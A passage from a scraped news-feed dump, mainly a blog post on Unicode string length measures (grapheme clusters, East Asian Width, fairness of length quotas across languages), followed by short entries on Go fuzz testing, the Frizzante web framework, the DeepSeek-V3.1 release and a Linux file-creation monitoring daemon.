“Long-Term Support” in the Ubuntu case means security patches but does not mean rolling forward the Unicode version that the system copy of ICU knows about. In the case of iOS, delegating to system ICU is probably OK and will not lead to too high probability of the text being from the future from the point of view of the OS copy of ICU, since the iOS ecosystem stays exceptionally well <a href=\"https://developer.apple.com/support/app-store/\">up-to-date</a>. However, delegating to system ICU is not such a great match for the idea of using Swift on the server side if the server side means running an old LTS distro.</p><p>(Swift 5 appears to no longer use system ICU for this. That is, Swift 5.0.3 on Ubuntu 14.04 sees one extended grapheme cluster in the string. I haven’t investigated what Swift 5 uses, but I assume that the switch to UTF-8 string representation necessitated using something other than ICU, which is heavily UTF-16-oriented. However, the result with Swift 4.2.3 nicely illustrates the issue related to using extended grapheme clusters.)</p><p>If you are doing things that  be extended grapheme cluster-aware, there just is no way around the issue of not being able to correctly segment text that comes from the future relative to the Unicode segmentation implementation that your program is using. This is not a reason to avoid extended grapheme clusters for tasks that  awareness of extended grapheme clusters.</p><p>However, pushing extended grapheme clusters onto tasks that do not really require the use of extended grapheme cluster introduces failure modes arising from the Unicode version dependency where such a dependency isn’t strictly necessary. For example, the Unicode version dependency of extended grapheme clusters means that you should  persist indices into a Swift strings and load them back in a future execution of your app, because an intervening Unicode data update may change the meaning of the persisted indices! The Swift string documentation does not warn against this.</p><p>Let’s consider other languages a bit.</p><p>C++ is often deployed such that the application developer doesn’t ship the standard library with the program. Most obviously, relying on GNU libstdc++ provided by an LTS Linux distribution presents similar problems as Swift 4 relying on ICU provided by an LTS Linux distribution. This isn’t a Linux-specific issue. Old supported branches of Windows <a href=\"https://github.com/sg16-unicode/sg16-meetings#may-22nd-2019\">generally don’t get new system-level Unicode data</a>, either. Even though there is some movement towards individual applications shipping their own copy of LLVM libc++ with the application and the increased pace of C++ standard development starting with C++11 has made using a system-provided C++ standard library more problematic even ignoring Unicode considerations, it doesn’t seem like a good idea for C++ to develop a tight coupling with extended grapheme clusters for operations that don’t strictly necessitate it as longs as stuck-in-the-past system libraries (whether the C++ standard library itself or another library that it delegates to) are a significant part of the C++ standard library distribution practice.</p><p>There’s <a href=\"https://github.com/tc39/proposal-intl-segmenter\">a proposal</a> to expose extended grapheme cluster segmentation to JavaScript programs. The main problem with this proposal is the implication on APK sizes on Android and the effect of APK sizes on browser competition on Android. But if we ignore that for the moment and imagine this was part of the Web Platform, it would still be problematic to build this dependency into operations for which working on extended grapheme clusters isn’t strictly necessary. While the most popular browsers are evergreen, there’s still a long tail of browser instances that aren’t on the latest engine versions. When JavaScript executes on such browsers, there’d be effects similar to running Swift 4 on Ubuntu 14.04.</p><p>In contrast to C++ or JavaScript, the current Rust approach is to statically link all Rust library code, including the standard library, into the executable program. This means that the application distributor is in control of library versions and doesn’t need to worry about the program executing in the context of out-of-date  libraries. The flip side is concerns about the size of the executable. People already (rightly or wrongly) complain about the sizes of Rust executables. Pulling in a lot of Unicode data due to baking extended grapheme cluster processing into programs whose problem domain doesn’t strictly require working with extended grapheme clusters would be problematic in embedded contexts where the executable size is a real problem and not just a perceived problem—and would obviously make the perceived problem worse, too. Furthermore, in order to avoid problems similar to those involved in relying on system libraries, baking tight coupling with Unicode data into the standard library necessitates the organizational capability of keeping up with new Unicode versions in this area where not only data in the tables keeps changing but the format of the tables and, therefore, the associated algorithms have still been changing recently. Right now of the two extended grapheme cluster crates outside the Rust standard library, the one that’s organizationally closer to the standard library is the one that’s out of date.</p><h2>Why Do We Want to Know Anyway?</h2><blockquote><p>“String length is about as meaningful a measurement as string height” – <a href=\"https://mobile.twitter.com/qntm/status/1118993107310325760\">@qntm</a></p></blockquote><p>Being able to allocate memory for strings gives a legitimate use case for knowing the storage length. However, in cases of Unicode scalar values or extended grapheme clusters, you typically want to iterate over them and look at each one instead of just knowing the count. So why do people want to know the count? As far as I can tell, there are two broad categories: Placing a quota limit that is fuzzy enough that it doesn’t need to be strictly tied to storage and trying to estimate how much text fits for display. Let’s look at the issue of estimating how much display space text takes, because it involves introducing yet another measurement of string length.</p><p>Simply looking at the Latin letters i and m should make it clear that the display size of a string depends on the font and on the specific characters in the string. From this observation, the whole notion of estimating display space by counting characters seems folly. Indeed, if you want to know exactly how much text fits into a given space, you need to run a typesetting algorithm with a specific font, which may have a complex relationship between scalar values and glyphs, to actually see where the overflow starts. Yet, even in the case of the Latin script that has letters such as i and m, e.g. magazine editors can find character counts useful enough for estimating how many print pages an article of a given character count length is going to fill.</p><p>As for computer user interfaces, character terminal user interfaces use a monospaced font where both i and m take up one character cell on a grid. In the context of a monospaced font, the extended grapheme cluster count in the context of the Latin script corresponds directly to display space taken. The same obviously applies to the Greek and Cyrillic scripts, which are so close to the Latin script that fonts even intend to reuse glyphs across these scripts. In contrast, CJK ideographs, Japanese kana, and Hangul syllables take two cells of a terminal grid. From the CJK perspective, these are full-width characters and the ASCII characters are half-width characters. There exist also half-width katakana characters which fit into an 8-bit encoding with ASCII and take one cell on the terminal grid and, therefore, are technically easier to fit to Latin script-oriented terminal systems. The display width on a terminal also has a correspondence to byte with the legacy CJK encodings: ASCII takes one byte, a CJK ideograph, a full-width kana or a Hangul syllable takes two bytes. In the case of Shift_JIS, half-width katakana takes one byte per character.</p><p>This brings us to the concept of <a href=\"https://www.unicode.org/reports/tr11/\">East Asian Width</a>. ASCII and half-width katakana characters are narrow. CJK ideographs, full-width kana, and Hangul syllables are wide. However, even in the worldview that is split to Latin, Greek, and Cyrillic on one hand and Chinese, Japanese, and Korean on the other hand, there are ambiguities. From the perspective of European legacy encodings, Greek and Cyrillic (as well as accented Latin) is equally wide as ASCII. However, in legacy CJK encodings, Greek and Cyrillic characters take two bytes. This means that in terms of East Asian Width, a string can have a general-purpose width, which resolves these ambiguous characters as narrow, or legacy CJK-context width, which resolves these ambiguous characters as wide.</p><p>So is the general-purpose variant (that resolves Greek and Cyrillic characters as narrow) of East Asian Width the one true string length measure? Well, no.</p><p>First of all, the concept ignores all scripts that are geographically and in Unicode order between Latin, Greek, and Cyrillic on one hand and CJK on the other (even though some other scripts that are structurally similar to the Latin, Greek, and Cyrillic scripts and make sense for a monospaced font, such as Armenian and the Georgian scripts, fit this concept, too, despite not having a history in pre-Unicode CJK context). As it happens, though, emoji do fit into the concept, except for <a href=\"https://mobile.twitter.com/fantasai/status/1080928442126909440\">weird errors in the Unicode database</a>. After all, emoji originate from Japan and were two bytes each when represented using the private use area of Shift_JIS.</p><p>Second, the concept assumes that there is one-to-one correspondence between scalar values and extended grapheme clusters. If we run this Rust program:</p><pre>use unicode_width::UnicodeWidthStr;\n\nfn main() {\n    println!(\"{}\", \"🤦🏼‍♂️\".width());\n}</pre><p>This is because the base emoji is wide (2), the combining skin tone modifier is also wide (2), the male sign is counted as narrow (1), and the zero-width joiner and the variation selector are treated as control characters that don’t count towards width. Obviously, this is not the answer that we want. The answer we want is 2. Ideas that come to mind immediately, such as only counting the width of the first character in an extended grapheme cluster or taking the width of the widest character in an extended grapheme cluster, don’t work, because flag emoji consist of two regional indicator symbol letter characters both of which have East Asian Width of Neutral (i.e. they are counted as narrow but are not marked as narrow, because they are considered to exist outside the domain of East Asian typography). I’m not aware of any official Unicode definition that would reliably return 2 as the width of every kind of emoji. 😭</p><p>If you really must estimate display size without running text layout with a font, whether the extended grapheme cluster count or the East Asian Width of the string works better depends on context.</p><h2>Arbitrary but Fair Quotas</h2><p>In some cases there is a desire to impose a length limit that doesn’t arise from a strict storage limitation. For example, in the STUN protocol given earlier, presumably there is a desire to make it so that human-readable error messages cannot make protocol messages arbitrarily long. For example, in the case of Twitter, tweets being short is a core part of the type of expression that Twitter is about, so some definition of “short” is needed. In the case of string-based browser , there is a need to have  limit, but the limit is necessarily arbitrary and does not need to strictly map to bytes on disk.</p><p>In cases like this, there seems to be some concern that the limit should be internationally fair. Observations that UTF-8 and UTF-16 take a different amount of storage per character depending on the character superficially suggests that the UTF-8 length or the UTF-16 length might be unfair internationally.</p><p>What’s fair, though? The usual concern goes that UTF-8 favors English, because English takes one byte per character, and disfavors CJK, because Chinese, Japanese, and Korean take three bytes per character, so UTF-8 in unfair to CJK. This kind of analysis ignores how much information is conveyed per character. To assess what lengths we get for different languages when the amount of information conveyed is kept constant, I looked at the counts for the translations of the Universal Declaration of Human Rights. This is a document for which <a href=\"https://www.unicode.org/udhr/translations.html\">translation of the same content is available in particularly many languages</a>, which is why I used it as the measurement corpus.</p><p>Unfortunately, not all translations contain the same text, so one needs to be careful when preparing the data for comparison. Some translations are incomplete, in some cases,  incomplete. For this reason, I included only translations in stage 4 or stage 5 along the 5-stage scale. Some translations carry the preamble with the recitals, but some do not. Some also carry historical notes. To make the length comparable, the preamble, notes, and whitespace-only text nodes were omitted. The rest of the XML text nodes were concatenated and normalized to Unicode Normalition Form C before counting. (<a href=\"https://github.com/hsivonen/udhrlen\">Source code is available</a>.)</p><p>Let’s look at the result. The table at the end of this document is sortable and is initially sorted by UTF-8 length. Each Δ% column shows how much the count in the column to its left deviates from the  count for that. (A note about color-coding. Coloring longer than median as red should not be taken to imply that those languages are somehow bad. It’s meant to imply that a length quota treats those languages badly.) In the table, the name of each language links to the translation in that language hosted on the site of the Unicode Consortium. The linked HTML versions may include the preamble and/or notes.</p><p>The CJK concern is alleviated when considering information conveyed. When measuring UTF-8 length, Mandarin using traditional characters is the shortest of the languages that have global name recognition! This should be expected, since the Han script pretty obviously packs more information per character than e.g. alphabetic scripts. (The globally less-known languages whose UTF-8 length is shorter than Mandarin’s (using traditional characters) are African and American Latin-script languages with a relatively small native speaker population for each—only one with a native speaker population exceeding a million and many whose native speaker population is smaller than 100 000, which explains why you might not recognize their names.)</p><p>Korean is also shorter than median in UTF-8 length. This also makes sense, since Hangul syllables pack three or two alphabetic jamo into one three-byte character. The UTF-8 length of Japanese is over median but only by 4.1%. The Japanese version of the text is 48% kanji and 52% hiragana. Japanese Wikipedia has almost the same kana to kanji ratio, though different kana: 46% kanji and the rest almost evenly split between hiragana and katakana, so we may assume the Universal Declaration of Human Rights to be representative of Japanese text in terms of kana to kanji ratio.</p><p>When sorting by UTF-16 code unit count, UTF-32 / scalar value count, or extended grapheme cluster count, CJK are the shortest. While it’s true that UTF-8 takes more bytes for CJK than UTF-16, the notion of UTF-8 being particularly disfavorable to CJK is not true <i>relative to other languages</i>. Rather, UTF-16 is particularly favorable to CJK. In particular, the Han script is so information-dense that even when sorting by East Asian Width, which effectively doubles the length of CJK but not other languages, Han-script languages stay clustered at the start of the table. Korean and Japanese move further but remain below median.</p><p>The language with the longest UTF-8 length is <a href=\"https://en.wikipedia.org/wiki/Shan_language\">Shan</a>, which uses the Burmese script. The Burmese language, also using the Burmese script, is the second-longest in UTF-8 length. There are a number of other Brahmic-script languages among the ones with the longest UTF-8 length. They use three bytes per character but don’t have CJK-like information per character density. These languages are below median in extended grapheme cluster count. In scalar value count, they intermingle with alphabetic languages.</p><p>It’s not clear if the concepts of median and mean (average) are meaningful. Does it make sense for a language with tens of millions of native speakers to count as an equal data point as a language with tens of thousands native speakers? Since this is about writing, should the numbers of writers be considered instead? (I.e. should literacy rates be taken into account?) In the hope that with a large number of languages in the table, median hand-wavily sorts out this kind of issue, I chose to compare with median. At least the Han-script languages have comparable numbers of native speakers as the Bhramic-script languages and provide a counter-weight at the other end of the spectrum of UTF-8 length. In any case, for measures other than UTF-8 length, median and mean are very close to each other.</p><p>Saying that Brahmic-script languages intermingle with alphabetic languages in character count is rather meaningless, though. In character count, after CJK (and Han-script Vietnamese and Yi-script Nousu), the language with the smallest character count is a Latin-script language (Waama). Also, the language with the largest character count is a Latin-script language (Ashéninka, Pichis). (<s>I find it odd that in UTF-8 length Ashéninka Perené is the second-shortest but Ashéninka, Pichis is long enough to reach the Brahmic cluster. I don’t know what the relation of these two languages is and what explains two languages whose name suggests close relation ending up in opposite extremes in length.</s> Update: It has been pointed out to me that the supposed Ashéninka Perené translation is a mislabeled duplicate of the Cashinahua translation.)</p><p>One might hypothesize that the Latin script has just been put to so many uses that some of the uses have to be far from what it has been optimized for. Yet, when considering language-specific alphabets, the character counts for Greek and Georgian are above median. It just is the case that languages are different. In that sense, the whole notion of trying to find a simple length measure that is fair across languages seems folly.</p><p>Let’s look at the the factor between the minimum and maximum of each measure, i.e. the factor with which the minimum needs to be multiplied to get the maximum. Let’s even ignore the outlier for maximum for each measure and use the second largest value instead of the largest value for each count. (Otherwise, Ashéninka, Pichis alone would skew the numbers a lot.) We get these factors:</p><table><tbody></tbody></table><p>UTF-16, UTF-32, and extended grapheme clusters aren’t distinguished by this measure, because the languages at the extremes use characters from the Basic Multilingual Plane with one character per grapheme cluster. Considering that there are supplementary-plane scripts, arguably the UTF-32 count would be fairer than the UTF-16 count even though this factor doesn’t show the difference. It’s not clear that counting extended grapheme clusters would be particularly fair compared to counting characters: It favors scripts that are visually joining over scripts that aren’t visually joining even if there’s no logical difference. While looking at just the factor, East Asian Width makes the gap the smallest, but it’s a rather imprecise fairness solution. It just counts CJK as double. Even after this, the Han-script languages are still among the ones with the smallest counts. On the other hand, it seems unfair to recognize Hangul syllables and kana as carrying more information than an alphabetic character while not giving the same treatment to other syllabaries, such as the Ethiopic script, Ge’ez.</p><p>Twitter counts each CJK character (including three-jamo Hangul syllables; i.e. it is not decomposing Hangul and treating it as alphabetic) as consuming 2 units of the quota (as when counting East Asian Width), counts emoji as consuming two units (even when East Asian Width of the cluster would be more), and, unlike East Asian Width, counts each Ethiopic syllable as consuming two units of the quota. What Twitter does seems fairer than just applying East Asian Width, but the result is still that the amount of information that can be packed in a tweet can vary four-fold depending on language. That still doesn’t seem exactly fair across languages.</p><ul><li>There is no simple measure of string length that would be fair in terms of how much information can be conveyed within a length quota regardless of language.</li><li>Of solutions that don’t depend on the Unicode database and, therefore, the Unicode version and that don’t ad-hoc hard-code character ranges according to a particular version of Unicode, counting characters aka. scalar values i.e. UTF-32 length is the best that can be done. It’s still wildly unfair leading to almost eight-fold differences in how much information can be conveyed. This is not a flaw of Unicode but arises from differences in languages and writing systems.</li><li>While counting scalar values is fairer than just counting UTF-8 or UTF-16 code units, the factor between minimum and maximum UTF-8 length is so close to the factor between minimum and maximum UTF-32 length, both of which are pretty large, that instead of putting thought into using the scalar value length instead of the UTF-8 length or the UTF-16 length, it’s probably better to put the thought into reconsidering if you  need to impose such a limit.</li><li>Unicode doesn’t provide a good database-based definition that would improve upon the character count in terms of normalizing the amount of information conveyed. While East Asian Width brings minimum and maximum closer, it unfairly singles out Hangul syllables and kana without considering other syllabaries, because normalizing length for information conveyed is not the purpose of East Asian Width.</li><li>Even if per-script (possibly non-integer) weights assigned to characters could make things fairer, it wouldn’t work well for the Latin script, which is all over the place in terms of language-dependent length.</li></ul><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr></tbody><tfoot><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr></tfoot></table>","contentLength":48289,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mx0t0g/its_not_wrong_that_length_7/"},{"title":"Fuzz-testing Go HTTP services","url":"https://packagemain.tech/p/fuzzing-http-services-golang","date":1755849351,"author":"/u/der_gopher","guid":236890,"unread":true,"content":"<p>That's where fuzz testing or fuzzing comes to the rescue.</p><p>Fuzzing is an automated software testing technique that involves inputting a large amount of valid, nearly-valid or invalid random data into a computer program and observing its behavior and output. So the goal of fuzzing is to reveal bugs, crashes and security vulnerabilities in source code you might not find through traditional testing methods.</p><p><a href=\"https://youtu.be/w8STTZWdG9Y\" rel=\"\">Fuzz Testing in Go</a></p><pre><code><code>func Equal(a []byte, b []byte) bool {\n  for i := range a {\n    // can panic with runtime error: index out of range.\n    if a[i] != b[i] {\n      return false\n    }\n  }\n\n  return true\n}</code></code></pre><p>Fuzzing technique would easily spot this bug by bombarding this function with various inputs.</p><p><a href=\"https://learn.microsoft.com/en-us/compliance/assurance/assurance-microsoft-security-development-lifecycle\" rel=\"\">one of the stages in its SDLC</a></p><p><a href=\"https://github.com/google/oss-fuzz\" rel=\"\">oss-fuzz</a></p><p>The steps to create a fuzz test in Go are the following:</p><ol></ol><p>Note, the fuzzing arguments can only be the following types:</p><ul><li><p>int,&nbsp;int8,&nbsp;int16,&nbsp;int32/rune,&nbsp;int64</p></li><li><p>uint,&nbsp;uint8,&nbsp;uint16,&nbsp;uint32,&nbsp;uint64</p></li></ul><pre><code>// Fuzz test\nfunc FuzzEqual(f *testing.F) {\n\n  // Seed corpus addition\n  f.Add([]byte{'f', 'u', 'z', 'z'}, []byte{'t', 'e', 's', 't'})\n\n  // Fuzz target with fuzzing arguments\n  f.Fuzz(func(t *testing.T, a []byte, b []byte) {\n    // Call our target function and pass fuzzing arguments\n    Equal(a, b)\n  })\n}</code></pre><pre><code><code>go test --fuzz=Fuzz -fuzztime=10s</code></code></pre><p>If there are any errors during the execution, the output should look similar to this:</p><pre><code><code>go test --fuzz=Fuzz -fuzztime=30s\n--- FAIL: FuzzEqual (0.02s)\n    --- FAIL: FuzzEqual (0.00s)\n        testing.go:1591: panic: runtime error: index out of range\n    Failing input written to testdata/fuzz/FuzzEqual/84ed65595ad05a58\n    To re-run:\n    go test -run=FuzzEqual/84ed65595ad05a58</code></code></pre><pre><code><code>go test -run=FuzzEqual/84ed65595ad05a58</code></code></pre><p>Let's now introduce a more real example such as an HTTP Handler that accepts some user input in the request body and then write a fuzz test for it.</p><pre><code><code>type Request struct {\n  Limit  int `json:\"limit\"`\n  Offset int `json:\"offset\"`\n}\n\ntype Response struct {\n  Results    []int `json:\"items\"`\n  PagesCount int   `json:\"pagesCount\"`\n}</code></code></pre><p>Our handler function then parses the JSON, paginates the static slice and returns a new JSON in response.</p><pre><code><code>func ProcessRequest(w http.ResponseWriter, r *http.Request) {\n  var req Request\n\n  // Decode JSON request\n  if err := json.NewDecoder(r.Body).Decode(&amp;req); err != nil {\n    http.Error(w, err.Error(), http.StatusBadRequest)\n    return\n  }\n\n  // Apply offset and limit to some static data\n  all := make([]int, 1000)\n  start := req.Offset\n  end := req.Offset + req.Limit\n  res := Response{\n    Results:    all[start:end],\n    PagesCount: len(all) / req.Limit,\n  }\n\n  // Send JSON response\n  if err := json.NewEncoder(w).Encode(res); err != nil {\n    http.Error(w, err.Error(), http.StatusInternalServerError)\n    return\n  }\n\n  w.WriteHeader(http.StatusOK)\n}</code></code></pre><pre><code><code>func FuzzProcessRequest(f *testing.F) {\n  // Create sample inputs for the fuzzer\n  testRequests := []Request{\n    {Limit: -10, Offset: -10},\n    {Limit: 0, Offset: 0},\n    {Limit: 100, Offset: 100},\n    {Limit: 200, Offset: 200},\n  }\n\n  // Add to the seed corpus\n  for _, r := range testRequests {\n    if data, err := json.Marshal(r); err == nil {\n      f.Add(data)\n    }\n  }\n\n  // ...\n}</code></code></pre><pre><code><code>func FuzzProcessRequest(f *testing.F) {\n  // ...\n\n  // Create a test server\n  srv := httptest.NewServer(http.HandlerFunc(ProcessRequest))\n  defer srv.Close()\n\n  // Fuzz target with a single []byte argument\n  f.Fuzz(func(t *testing.T, data []byte) {\n    var req Request\n    if err := json.Unmarshal(data, &amp;req); err != nil {\n      // Skip invalid JSON requests that may be generated during fuzz\n      t.Skip(\"invalid json\")\n    }\n\n    // Pass data to the server\n    resp, err := http.DefaultClient.Post(srv.URL, \"application/json\", bytes.NewBuffer(data))\n    if err != nil {\n      t.Fatalf(\"unable to call server: %v, data: %s\", err, string(data))\n    }\n\n    defer resp.Body.Close()\n\n    // Skip BadRequest errors\n    if resp.StatusCode == http.StatusBadRequest {\n      t.Skip(\"invalid json\")\n    }\n\n    // Check status code\n    if resp.StatusCode != http.StatusOK {\n      t.Fatalf(\"non-200 status code %d\", resp.StatusCode)\n    }\n  })\n}</code></code></pre><pre><code><code>go test --fuzz=Fuzz -fuzztime=10s -parallel=1</code></code></pre><p>And as expected we will see the following errors uncovered.</p><pre><code><code>go test --fuzz=Fuzz -fuzztime=30s\n--- FAIL: FuzzProcessRequest (0.02s)\n    --- FAIL: FuzzProcessRequest (0.00s)\n        runtime error: integer divide by zero\n        runtime error: slice bounds out of range</code></code></pre><pre><code><code>go test fuzz v1\n[]byte(\"{\"limit\":0,\"offset\":0}\")</code></code></pre><p>To fix that issue we can introduce input validation and default settings:</p><pre><code><code>if req.Limit &lt;= 0 {\n  req.Limit = 1\n}\n\nif req.Offset &lt; 0 {\n  req.Offset = 0\n}\n\nif req.Offset &gt; len(all) {\n  start = len(all) - 1\n}\n\nif end &gt; len(all) {\n  end = len(all)\n}</code></code></pre><p>With this change the fuzz tests will run for 10 seconds and exit without an error.</p><p>Writing fuzz tests for your HTTP services or any other methods is a great way to detect hard-to-find bugs. Fuzzers can detect hard-to-spot bugs that happen for only some weird unexpected input.</p><p><a href=\"https://github.com/dvyukov/go-fuzz\" rel=\"\">go-fuzz</a></p>","contentLength":4973,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mx0e0a/fuzztesting_go_http_services/"},{"title":"SIPgo is entering in 1.0.0 alpah","url":"https://www.reddit.com/r/golang/comments/1mx0c2o/sipgo_is_entering_in_100_alpah/","date":1755849131,"author":"/u/emiago","guid":236787,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/emiago\"> /u/emiago </a>","contentLength":29,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Apple Type-C PHY driver RFC posted to kernel mailing list","url":"https://lore.kernel.org/lkml/20250821-atcphy-6-17-v1-21-172beda182b8@kernel.org/","date":1755848812,"author":"/u/TheTwelveYearOld","guid":236938,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mx096d/apple_typec_phy_driver_rfc_posted_to_kernel/"},{"title":"Frizzante, an opinionated web framework that renders Svelte.","url":"https://www.reddit.com/r/golang/comments/1mwzquz/frizzante_an_opinionated_web_framework_that/","date":1755846828,"author":"/u/loopcake","guid":237163,"unread":true,"content":"<p>Hello <a href=\"https://www.reddit.com/r/golang\">r/golang</a>, this is both an update and an introduction of Frizzante to this sub.</p><p>Frizzante is an opinionated web server framework written in Go that uses Svelte to render web pages.</p><p>As mentioned above, this is also an update on Frizzante.</p><p>We've recently added Windows support and finished implementing our own CLI, a hub for all thing Frizzante.</p><p>Before this update we couldn't support Windows due to some of our dependencies also not supporting it directly.</p><p>We don't plan on modifying the core of Frizzante too much from now on, unless necessary.</p><p>Our plan on rolling out new features is to do so through code generation, and for that we're implementing our own CLI.</p><p>We want to automate as much as possible when rolling out new features, simply exposing an API is often not enough.</p><p>Through a CLI when can generate not only code, but also resources, examples directly into your project, which ideally you would modify and adapt to your own needs.</p><ul><li>configure the project, installing all dependencies and required binaries in a local directory (we don't want to mess with the developer's environment, so everything is local to the project)</li><li>update packages (bumps versions to latest)</li><li>lookup and install packages interactively (currently we support only NPM lookups, you will soon be able to also lookup GO packages)</li><li>format all your code, GO, JS and Svelte</li><li>generate code (and resources), as mentioned above</li></ul><p>Some things we currently can generate for you</p><ul><li><a href=\"https://razshare.github.io/frizzante-docs/guides/web-standards/#link-component\">adaptive link</a> component, same as above, but it wraps a standard hyperlink &lt;a&gt;</li><li>session management code, manages user sessions in-memory or on-disk (useful for development)</li><li>full SQLite database setup along with SQLC configuration, queries and schema files</li><li>Go code from SQL queries, through SQLC</li></ul><p>Some of these features are not well documented yet.</p><p>We'll soon enter a feature freeze phase and make sure the documentation website catches up with the code.</p><p>Subjective feedback on the documentation and its style is very welcome.</p><p>We now also offer a docker solution.</p><p>Initially this was our way to support Windows development, however we can now cross compile to Windows directly.</p><p>We decided to keep our docker solution because it can still be very useful for deployment and for developers who actually prefer developing in a docker container.</p><p>We don't want friction of setting things up. More code and resource generation features will come in the future.</p><p>I hope you like what we're building and have a nice weekend.</p>","contentLength":2433,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"DeepSeek-V3.1 Release","url":"https://api-docs.deepseek.com/news/news250821","date":1755846697,"author":"/u/JadeLuxe","guid":236844,"unread":true,"content":"<p>Introducing DeepSeek-V3.1: our first step toward the agent era! 🚀</p><ul><li><p>🧠 Hybrid inference: Think &amp; Non-Think — one model, two modes</p></li><li><p>⚡️ Faster thinking: DeepSeek-V3.1-Think reaches answers in less time vs. DeepSeek-R1-0528</p></li><li><p>🛠️ Stronger agent skills: Post-training boosts tool use and multi-step agent tasks</p></li></ul><ul><li><p>📈 Better results on SWE / Terminal-Bench</p></li><li><p>🔍 Stronger multi-step reasoning for complex search tasks</p></li><li><p>⚡️ Big gains in thinking efficiency</p></li></ul>","contentLength":454,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwzpng/deepseekv31_release/"},{"title":"A daemon to monitor file creation in the user-selected dirs and to write down who created those files","url":"https://www.reddit.com/r/linux/comments/1mwyt52/a_daemon_to_monitor_file_creation_in_the/","date":1755843318,"author":"/u/Lembot-0004","guid":237023,"unread":true,"content":"<p><strong>\"Who\" means \"what process\".</strong> (It looks like this wording might lead to misunderstanding and Reddit still doesn't allow editing titles.)</p><p>A story behind the daemon: a few weeks ago I noticed that I don’t have space in my /home. Investigation led to deleting ~20GiB of ancient garbage from the dot-dirs there. In too many cases I wasn’t been able to detect who created those files and if I need them. I didn’t like this situation, so I present you with a solution.</p><p>The daemon is in state \"it works on my machine\" yet, so bugs are expected. Nothing harmful is expected though.</p><p>If you use MATE, you can use the extension for Caja to avoid touching the daemon's CLI:</p><p>Just press the RMB on the file and select \"Who made this?\"</p><p>The daemon works with fanotify, so root privileges are needed.</p><p>Extension just kicks \"whomade -w\" command, so daemon should be somewhere described by PATH var.</p>","contentLength":877,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Reddit is the top source of info for LLMs, almost double than Google!","url":"https://www.reddit.com/r/artificial/comments/1mwxrvz/reddit_is_the_top_source_of_info_for_llms_almost/","date":1755839643,"author":"/u/Ok-Maximum875","guid":236939,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Using LLMs to extract knowledge graphs from tables for retrieval-augmented methods — promising or just recursion?","url":"https://www.reddit.com/r/MachineLearning/comments/1mwxfxj/d_using_llms_to_extract_knowledge_graphs_from/","date":1755838541,"author":"/u/Puzzled_Boot_3062","guid":236786,"unread":true,"content":"<p>I’ve been thinking about an approach where large language models are used 